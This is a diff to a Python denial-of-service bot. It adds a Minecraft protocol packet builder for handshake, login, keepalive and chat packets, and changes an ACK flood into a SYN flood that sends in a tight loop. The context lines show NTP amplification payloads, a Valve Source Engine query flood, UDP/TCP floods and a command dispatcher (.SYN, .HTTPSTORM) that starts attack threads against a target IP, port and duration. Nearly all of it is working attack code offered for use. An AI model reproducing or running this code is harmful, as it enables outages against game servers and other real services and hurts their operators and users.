@@ -1,9 +1,12 @@
 import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
+from struct import pack as data_pack
 from multiprocessing import Process
 from urllib.parse import urlparse
 from scapy.all import IP, UDP, Raw, ICMP, send
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
+from typing import Any, List, Set, Tuple
+from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
@@ -32,6 +35,94 @@ def rand_ua():
         random.randint(92215, 99999),
         random.random() + random.randint(3, 9)
     )
+
+
+class Minecraft:
+    @staticmethod
+    def varint(d: int) -> bytes:
+        o = b''
+        while True:
+            b = d & 0x7F
+            d >>= 7
+            o += data_pack("B", b | (0x80 if d > 0 else 0))
+            if d == 0:
+                break
+        return o
+
+    @staticmethod
+    def data(*payload: bytes) -> bytes:
+        payload = b''.join(payload)
+        return Minecraft.varint(len(payload)) + payload
+
+    @staticmethod
+    def short(integer: int) -> bytes:
+        return data_pack('>H', integer)
+
+    @staticmethod
+    def long(integer: int) -> bytes:
+        return data_pack('>q', integer)
+
+    @staticmethod
+    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(target[0].encode()),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(
+                                  target[0].encode(),
+                                  b"\x00",
+                                  ip.encode(),
+                                  b"\x00",
+                                  uuid.hex.encode()
+                              ),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def login(protocol: int, username: str) -> bytes:
+        if isinstance(username, str):
+            username = username.encode()
+        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
+                                               0x01 if protocol >= 385 else \
+                                               0x00),
+                              Minecraft.data(username))
+
+    @staticmethod
+    def keepalive(protocol: int, num_id: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
+                                               0x10 if protocol >= 712 else \
+                                               0x0F if protocol >= 471 else \
+                                               0x10 if protocol >= 464 else \
+                                               0x0E if protocol >= 389 else \
+                                               0x0C if protocol >= 386 else \
+                                               0x0B if protocol >= 345 else \
+                                               0x0A if protocol >= 343 else \
+                                               0x0B if protocol >= 336 else \
+                                               0x0C if protocol >= 318 else \
+                                               0x0B if protocol >= 107 else \
+                                               0x00),
+                              Minecraft.long(num_id) if protocol >= 339 else \
+                              Minecraft.varint(num_id))
+
+    @staticmethod
+    def chat(protocol: int, message: str) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
+                                               0x03 if protocol >= 464 else \
+                                               0x02 if protocol >= 389 else \
+                                               0x01 if protocol >= 343 else \
+                                               0x02 if protocol >= 336 else \
+                                               0x03 if protocol >= 318 else \
+                                               0x02 if protocol >= 107 else \
+                                               0x01),
+                              Minecraft.data(message.encode()))
+
+
 
 # AMP METHODS ----------------->
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
@@ -312,13 +403,19 @@ def attack_tcp(ip, port, secs, size):
         except:
             pass
 
-def attack_ack(ip, port, secs):
+def attack_SYN(ip, port, secs):
+    
     while time.time() < secs:
+        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        flags = 0b01000000
+        
         try:
             s.connect((ip, port))
-            ack = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, 0b01010000, 0b00000010, 0, 0, 0)
-            s.send(ack)
+            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
+            
+            while time.time() < secs:
+                s.send(pkt)
         except:
             s.close()
 
@@ -347,7 +444,9 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
 
 def attack_vse(ip, port, secs):
-    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # Read more here > https://developer.valvesoftware.com/wiki/Server_queries
+    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries
+    
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
@@ -512,14 +611,14 @@ def main():
                         threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                         threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
 
-                elif command == '.ACK':
+                elif command == '.SYN':
                     ip = args[1]
                     port = int(args[2])
                     secs = time.time() + int(args[3])
                     threads = int(args[4])
 
                     for _ in range(threads):
-                        threading.Thread(target=attack_ack, args=(ip, port, secs), daemon=True).start()
+                        threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()
                 
                 elif command == ".HTTPSTORM":
                     url = args[1]
